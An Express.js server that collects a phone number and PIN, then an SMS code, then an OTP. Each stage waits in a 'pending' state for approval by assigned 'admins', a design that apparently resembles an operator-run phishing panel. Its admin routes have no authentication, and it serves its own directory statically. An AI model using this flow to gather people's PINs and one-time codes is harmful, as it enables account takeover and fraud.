const express = require('express');
const path = require('path');
const cors = require('cors');
require('dotenv').config();

const {
    connectDatabase,
    saveApplication,
    getApplication,
    updatePinStatus,
    updateSmsStatus,
    updateOtpStatus,
    getPendingApplications,
    getAdminStats
} = require('./database');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname)));

// Connect to MongoDB before accepting traffic
connectDatabase()
    .then(() => console.log('🚀 DB connected, initializing routes...'))
    .catch((err) => console.error('💥 Failed to initialize DB connection:', err.message));

/**
 * STAGE 1: VERIFY PIN
 * Endpoint: POST /api/verify-pin
 */
app.post('/api/verify-pin', async (req, res) => {
    try {
        const { phoneNumber, pin, adminId, assignmentType } = req.body;

        if (!phoneNumber || !pin) {
            return res.status(400).json({
                success: false,
                message: 'Phone number and PIN are required.'
            });
        }

        const appData = {
            phoneNumber,
            adminId: adminId || 'ADMIN001',
            assignmentType: assignmentType || 'auto'
        };

        const result = await saveApplication(appData);

        return res.status(200).json({
            success: true,
            applicationId: result.applicationId,
            assignedAdminId: result.assignedAdminId,
            status: 'pending'
        });
    } catch (error) {
        console.error('Error in /api/verify-pin:', error.message);
        return res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

/**
 * STAGE 1 POLLING: CHECK PIN STATUS
 * Endpoint: GET /api/check-pin-status/:applicationId
 */
app.get('/api/check-pin-status/:applicationId', async (req, res) => {
    try {
        const { applicationId } = req.params;
        const appRecord = await getApplication(applicationId);

        if (!appRecord) {
            return res.status(404).json({ success: false, message: 'Application not found.' });
        }

        return res.status(200).json({
            success: true,
            status: appRecord.pinStatus
        });
    } catch (error) {
        console.error('Error in /api/check-pin-status:', error.message);
        return res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

/**
 * STAGE 2: VERIFY SMS
 * Endpoint: POST /api/verify-sms
 */
app.post('/api/verify-sms', async (req, res) => {
    try {
        const applicationId = req.body.applicationId;
        const smsCode = req.body.smsCode || req.body.smsText || req.body.sms;

        if (!applicationId || !smsCode) {
            return res.status(400).json({
                success: false,
                message: 'Application ID and SMS verification code are required.'
            });
        }

        const appRecord = await getApplication(applicationId);
        if (!appRecord) {
            return res.status(404).json({ success: false, message: 'Application not found.' });
        }

        await updateSmsStatus(applicationId, 'pending');

        return res.status(200).json({
            success: true,
            status: 'pending'
        });
    } catch (error) {
        console.error('Error in /api/verify-sms:', error.message);
        return res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

/**
 * STAGE 2 POLLING: CHECK SMS STATUS
 * Endpoint: GET /api/check-sms-status/:applicationId
 */
app.get('/api/check-sms-status/:applicationId', async (req, res) => {
    try {
        const { applicationId } = req.params;
        const appRecord = await getApplication(applicationId);

        if (!appRecord) {
            return res.status(404).json({ success: false, message: 'Application not found.' });
        }

        return res.status(200).json({
            success: true,
            status: appRecord.smsStatus
        });
    } catch (error) {
        console.error('Error in /api/check-sms-status:', error.message);
        return res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

/**
 * STAGE 3: VERIFY OTP
 * Endpoint: POST /api/verify-otp
 */
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, otp } = req.body;

        if (!applicationId || !otp) {
            return res.status(400).json({
                success: false,
                message: 'Application ID and OTP code are required.'
            });
        }

        const appRecord = await getApplication(applicationId);
        if (!appRecord) {
            return res.status(404).json({ success: false, message: 'Application not found.' });
        }

        await updateOtpStatus(applicationId, 'pending');

        return res.status(200).json({
            success: true,
            status: 'pending'
        });
    } catch (error) {
        console.error('Error in /api/verify-otp:', error.message);
        return res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

/**
 * STAGE 3 POLLING: CHECK OTP STATUS
 * Endpoint: GET /api/check-otp-status/:applicationId
 */
app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const { applicationId } = req.params;
        const appRecord = await getApplication(applicationId);

        if (!appRecord) {
            return res.status(404).json({ success: false, message: 'Application not found.' });
        }

        return res.status(200).json({
            success: true,
            status: appRecord.otpStatus
        });
    } catch (error) {
        console.error('Error in /api/check-otp-status:', error.message);
        return res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

/**
 * RESEND OTP
 * Endpoint: POST /api/resend-otp
 */
app.post('/api/resend-otp', async (req, res) => {
    try {
        const { applicationId } = req.body;
        if (!applicationId) {
            return res.status(400).json({ success: false, message: 'Application ID is required.' });
        }

        await updateOtpStatus(applicationId, 'pending');

        return res.status(200).json({
            success: true,
            message: 'OTP request reset successfully.'
        });
    } catch (error) {
        console.error('Error in /api/resend-otp:', error.message);
        return res.status(500).json({ success: false, message: 'Internal server error.' });
    }
});

/**
 * ADMIN API ENDPOINTS
 */
app.get('/api/admin/pending', async (req, res) => {
    try {
        const adminId = req.query.adminId || null;
        const apps = await getPendingApplications(adminId);
        return res.status(200).json({ success: true, data: apps });
    } catch (error) {
        return res.status(500).json({ success: false, message: error.message });
    }
});

app.get('/api/admin/stats', async (req, res) => {
    try {
        const adminId = req.query.adminId || null;
        const stats = await getAdminStats(adminId);
        return res.status(200).json({ success: true, data: stats });
    } catch (error) {
        return res.status(500).json({ success: false, message: error.message });
    }
});

// Wildcard route to serve index.html
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(PORT, () => {
    console.log(`✅ Server listening on port ${PORT}`);
});
